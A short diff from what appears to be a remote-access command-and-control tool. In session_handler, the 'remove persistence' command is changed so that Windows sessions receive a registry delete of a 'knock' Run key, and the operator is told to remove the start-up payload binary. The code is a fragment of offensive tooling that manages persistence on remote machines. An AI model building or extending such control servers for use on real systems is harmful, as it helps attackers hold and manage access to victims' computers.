@@ -105,17 +105,15 @@ def session_handler(session_id):
                 message = f'echo "Performing persistence command for non-windows"'
 
         if message == 'remove persistence':
-            print('[!] Not yet implemented')
-            print('[!] Run the following command to clean up the registry: \nreg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f')
-            message = ''
-            # if sessions[num - 1][5] == 'Windows':
-            #     message = f'cmd.exe /c del C:\\Users\\Public\\{payload_name}'
-            #     session_id.send(message.encode())
-            #     response = inbound_message(session_id)
-            #     print(response)
-            #     time.sleep(1)
-            #     message = f'reg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f'
-            #     print('[!] Trying to clean up the registry [!]')
+            if sessions[num - 1][5] == 'Windows':
+                message = f'reg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f'
+                print('[!] Trying to clean up the HKCU registry [!]')
+                print(
+                    f'[!] Make sure to remove the start-up binary: C:\\Users\\Public\\{payload_name} [!]')
+            else:
+                print('[!] Not yet implemented')
+                message = ''
+
         if not message:
             continue
         outbound_message(session_id, message)
